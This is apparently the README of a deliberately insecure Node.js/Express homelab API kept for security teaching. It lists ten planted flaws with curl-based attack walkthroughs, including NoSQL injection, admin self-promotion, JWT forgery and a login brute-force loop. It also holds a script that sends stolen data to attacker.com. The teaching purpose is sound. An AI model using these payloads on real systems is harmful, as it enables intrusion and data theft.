# Secure Blueprint API
Secure Node.js/Express API built to manage devices, services, and security findings in my cybersecurity homelab. Demonstrates clean API development and security best practices.

# VULNERABLE Homelab API

> **⚠️ WARNING: This branch is INTENTIONALLY insecure.**
> It contains multiple security vulnerabilities for learning and demonstration purposes only.
> **Do NOT deploy this in any real or production environment.**

This branch demonstrates common security mistakes found in real-world Node.js/Express APIs.
Compare it with the secure `main` branch to understand what good security practice looks like.

---

## Purpose

- Showcase real-world vulnerabilities in a controlled environment.
- Demonstrate how attackers exploit insecure APIs.
- Serve as a hands-on teaching tool for cybersecurity awareness.

---

## How to Run

```bash
# 1. Copy the environment file
cp .env.example .env

# 2. Start the containers
docker-compose up --build
```

The API will be available at `http://localhost:5000`.

---

## Vulnerability Index

| # | Vulnerability | Location | Risk |
|---|---|---|---|
| 1 | Plain-text password storage | `User.js` | Credential theft |
| 2 | No authentication on routes | `devices.js`, `services.js` | Unauthorized access |
| 3 | NoSQL Injection | `services.js` GET `/` | Data exfiltration |
| 4 | Mass assignment | All POST/PUT routes | Privilege escalation |
| 5 | Weak & hardcoded JWT secret | `authController.js`, `.env.example` | Token forgery |
| 6 | No rate limiting | `server.js` | Brute force / DoS |
| 7 | No security headers | `server.js` | XSS, Clickjacking |
| 8 | Overly permissive CORS | `server.js` | Cross-origin attacks |
| 9 | Detailed error messages | All controllers | Information disclosure |
| 10 | No input validation | All routes | Injection, bad data |

---

## Vulnerabilities & Attack Walkthroughs

### 1. Plain-text Password Storage

**Location:** `src/models/User.js`, `src/controllers/authController.js`

**What's wrong:** Passwords are stored and compared as plain text. There is no hashing (e.g. bcrypt).

**Attack — register a user, then read the password directly from MongoDB:**

```bash
# Register
curl -s -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","email":"victim@lab.com","password":"MySecret123"}'

# If you gain DB access (e.g. via injection), passwords are fully readable:
# { "email": "victim@lab.com", "password": "MySecret123" }
```

**Impact:** A single database breach exposes every user's real password. Attackers can also reuse them across other services (credential stuffing).

---

### 2. No Authentication on Routes

**Location:** `src/routes/devices.js`, `src/routes/services.js`

**What's wrong:** Every device and service endpoint is completely open — no token or session required.

**Attack — read and create data without logging in:**

```bash
# Read all devices without any credentials
curl http://localhost:5000/api/devices

# Create a device without any credentials
curl -s -X POST http://localhost:5000/api/devices \
  -H "Content-Type: application/json" \
  -d '{"name":"Rogue Device","ip":"10.0.0.99","type":"attacker"}'

# Read all services
curl http://localhost:5000/api/services
```

**Impact:** Anyone who can reach the API can read, create, modify, or delete all data.

---

### 3. NoSQL Injection

**Location:** `src/routes/services.js` — `GET /api/services`

**What's wrong:** `req.query` is passed directly into `Service.find()` without any sanitization, allowing MongoDB query operators to be injected via URL parameters.

**Attack — dump all services regardless of any filter logic:**

```bash
# Inject a MongoDB $gt operator to bypass any value-based filter
curl "http://localhost:5000/api/services?vulnerabilityScore[\$gt]=0"

# Return all services where status is NOT "inactive"
curl "http://localhost:5000/api/services?status[\$ne]=inactive"
```

**Impact:** Attackers can bypass filters, dump entire collections, and potentially access records they should never see.

---

### 4. Mass Assignment / Privilege Escalation

**Location:** All POST and PUT routes — models use `strict: false`

**What's wrong:** `req.body` is passed directly into `Model.create()` and `findByIdAndUpdate()` with no field whitelisting. The schemas also have `strict: false`, meaning MongoDB will store *any* field sent by the client.

**Attack — self-promote to admin at registration:**

```bash
# Register while injecting isAdmin: true and a custom role
curl -s -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hacker@lab.com","password":"pw","role":"admin","isAdmin":true}'

# Create a device with a spoofed userId and admin flag
curl -s -X POST http://localhost:5000/api/devices \
  -H "Content-Type: application/json" \
  -d '{"name":"Evil Device","ip":"1.2.3.4","isAdmin":true,"userId":"000000000000"}'
```

**Impact:** Attackers can grant themselves admin privileges, spoof ownership of records, or store arbitrary data in the database.

---

### 5. Weak & Hardcoded JWT Secret

**Location:** `src/controllers/authController.js`, `.env.example`

**What's wrong:** The JWT secret is `superweaksecret123` — committed to the repo and trivially guessable. Tokens are also signed with no expiry.

**Attack — forge a valid JWT for any user:**

```bash
# Install the jwt cli tool
npm install -g jsonwebtoken

# Using Node.js, forge a token for any userId with role admin
node -e "
const jwt = require('jsonwebtoken');
const forged = jwt.sign({ id: '000000000000000000000000', role: 'admin' }, 'superweaksecret123');
console.log(forged);
"
```

The forged token will pass all server-side `jwt.verify()` checks because the secret matches.

**Impact:** Anyone who knows (or guesses) the secret can forge identity tokens for any user, including admins, with no expiry.

---

### 6. No Rate Limiting

**Location:** `src/server.js`

**What's wrong:** There is no rate limiting middleware (e.g. `express-rate-limit`). Every endpoint accepts unlimited requests.

**Attack — brute-force the login endpoint:**

```bash
# Try passwords in a loop until one works
for pw in password123 secret admin 123456 MySecret123; do
  echo -n "Trying $pw: "
  curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@lab.com\",\"password\":\"$pw\"}"
  echo
done
```

**Impact:** Attackers can brute-force passwords or flood the API with requests causing a denial of service.

---

### 7. No Security Headers

**Location:** `src/server.js` — Helmet is not used

**What's wrong:** The API sends no protective HTTP headers. A browser-facing app built on this API would be exposed to multiple client-side attacks.

**Attack — check which headers are missing:**

```bash
curl -I http://localhost:5000/api/devices
```

You will notice the absence of:
- `X-Content-Type-Options` → MIME sniffing attacks
- `X-Frame-Options` → Clickjacking
- `Content-Security-Policy` → XSS
- `Strict-Transport-Security` → SSL stripping
- `X-XSS-Protection` → reflected XSS

**Impact:** Browsers offer zero protection against clickjacking, XSS, and MIME-type attacks.

---

### 8. Overly Permissive CORS

**Location:** `src/server.js` — `cors({ origin: '*' })`

**What's wrong:** Any website in the world can make authenticated cross-origin requests to this API.

**Attack — malicious page making cross-origin requests:**

```html
<!-- Hosted on attacker.com -->
<script>
  fetch('http://localhost:5000/api/devices')
    .then(r => r.json())
    .then(data => {
      // Send stolen data to attacker's server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

**Impact:** Any malicious website a victim visits can silently read from or write to the API on their behalf.

---

### 9. Detailed Error Messages (Information Disclosure)

**Location:** All controllers and routes

**What's wrong:** Raw `error.message` from Mongoose and Node.js is returned directly in API responses.

**Attack — trigger an error to reveal internal structure:**

```bash
# Send a malformed MongoDB ObjectId to reveal schema/driver details
curl http://localhost:5000/api/services/not-a-valid-id
# Response: { "error": "Cast to ObjectId failed for value \"not-a-valid-id\" at path \"_id\" for model \"Service\"" }

# Send invalid JSON body to reveal Express internals
curl -s -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{bad json'
```

**Impact:** Error messages reveal model names, field names, database driver versions, and internal structure — all useful for crafting further attacks.

---

### 10. No Input Validation

**Location:** All routes

**What's wrong:** No library (e.g. Joi, Zod, express-validator) validates the shape, type, or length of incoming data before it reaches the database.

**Attack — store oversized or malformed data:**

```bash
# Store a 1MB string in the 'notes' field of a device
curl -s -X POST http://localhost:5000/api/devices \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"bomb\",\"notes\":\"$(python3 -c 'print("A"*1000000)')\"}"

# Store a negative port number in a service
curl -s -X POST http://localhost:5000/api/services \
  -H "Content-Type: application/json" \
  -d '{"name":"BadService","port":-99999,"status":"<script>alert(1)</script>"}'
```

**Impact:** Malformed data corrupts the database, causes downstream errors, and can be used as a vector for stored XSS or denial of service.

---

## Branch Comparison

| Feature | `vulnerable` branch | `main` branch |
|---|---|---|
| Password hashing | ❌ Plain text | ✅ bcrypt |
| Route authentication | ❌ None | ✅ JWT middleware |
| Input validation | ❌ None | ✅ Joi / schema validation |
| Security headers | ❌ None | ✅ Helmet |
| Rate limiting | ❌ None | ✅ express-rate-limit |
| CORS policy | ❌ Wildcard `*` | ✅ Restricted origin |
| JWT secret | ❌ Hardcoded, weak | ✅ Strong env variable |
| Error messages | ❌ Full stack/detail | ✅ Generic messages |
| NoSQL sanitization | ❌ None | ✅ mongo-sanitize |
| Mongoose strict mode | ❌ `strict: false` | ✅ `strict: true` |
